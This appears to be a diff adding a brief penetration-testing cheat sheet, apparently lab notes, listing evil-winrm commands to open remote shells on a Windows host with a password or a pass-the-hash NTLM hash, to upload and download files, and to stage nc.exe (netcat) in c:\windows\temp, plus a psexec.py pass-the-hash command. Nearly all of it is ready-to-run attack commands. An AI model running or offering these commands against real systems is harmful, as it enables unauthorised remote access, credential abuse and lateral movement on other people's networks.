@@ -1,0 +1,14 @@
+### evil-winrm ###
+evil-winrm -u USER -p PASS -i 10.200.57.150
+evil-winrm -u USER -H HASH -i 10.200.57.150
+evil-winrm -u USER -p PASS -i IP -s /path/to/powershell-script
+
+upload LOCAL_FILEPATH REMOTE_FILEPATH
+download REMOTE_FILEPATH LOCAL_FILEPATH
+
+> upload /path/to/file c:\windows\temp\nc.exe
+> dir c:\windows\temp\nc.exe
+
+
+### psexec ###
+psexec.py -hashes salt:hash user@domain.com
